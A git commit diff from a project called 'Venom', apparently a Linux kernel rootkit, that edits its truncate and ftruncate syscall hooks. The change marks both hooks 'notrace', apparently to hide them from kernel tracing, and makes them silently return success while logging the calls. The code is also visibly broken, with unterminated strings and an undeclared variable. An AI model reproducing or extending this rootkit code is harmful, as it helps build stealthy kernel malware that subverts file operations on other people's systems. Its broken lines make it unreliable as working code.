c9b1eba18d10b1539b7e621cd569cf4a19b60247
!0xTrev <136177431+Trevohack@users.noreply.github.com>
2025-10-06 20:55:13 +0530

    Venom - Hook Truncate

--- hooks/truncate.h
+++ hooks/truncate.h
@@ -1,4 +1,3 @@
-
 #ifndef TRUNCATE_HOOK_H
 #define TRUNCATE_HOOK_H
 
@@ -11,32 +10,39 @@
 typedef asmlinkage long (*orig_truncate_t)(const struct pt_regs *);
 typedef asmlinkage long (*orig_ftruncate_t)(const struct pt_regs *);
 
-static orig_truncate_t orig_truncate = NULL; // holding area
+static orig_truncate_t orig_truncate = NULL; // holding area 
 static orig_ftruncate_t orig_ftruncate = NULL;
 
 // main area  or our main logic of the hook
-asmlinkage long hook_truncate(const struct pt_regs *regs)
+notrace asmlinkage long hook_truncate(const struct pt_regs *regs)
 {
     char kd[256] = "";
     const char __user *pathname = (const char __user *)regs->di;
     unsigned long length = (unsigned long)regs->si;
 
-    if (pathname && strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) < 0)
+    if (pathname && strncpy_from_user(kd, pathname, sizeof(kd) - 1) < 0)
         kd[0] = '\0';
+    
 
+    TLOG_INF("[VENOM] HOOKED TRUNCATE\n);
+    TLOG_INF("[VENOM] File Descriptor: %d\n", fd);
+    TLOG_INF("[VENOM] Length: %lu\n", length);
 
-
-    return -EPERM; // this returns an eror if someone tries to truncate a file this will be called for a reason we can check the docs for more type of this hehe
+    return 0; 
 }
 
-//  out ftruncate hook area easy hook not hard
-asmlinkage long hook_ftruncate(const struct pt_regs *regs)
+//  out ftruncate hook area easy hook not hard 
+notrace asmlinkage long hook_ftruncate(const struct pt_regs *regs)
 {
     int fd = (int)regs->di;
     unsigned long length = (unsigned long)regs->si;
 
 
-    return -EPERM;
+    TLOG_INF("[VENOM] HOOKED FTRUNCATE\n);
+    TLOG_INF("[VENOM] File Descriptor: %d\n", fd);
+    TLOG_INF("[VENOM] Length: %lu\n", length);
+
+    return 0;
 }
 
-#endif
+#endif 
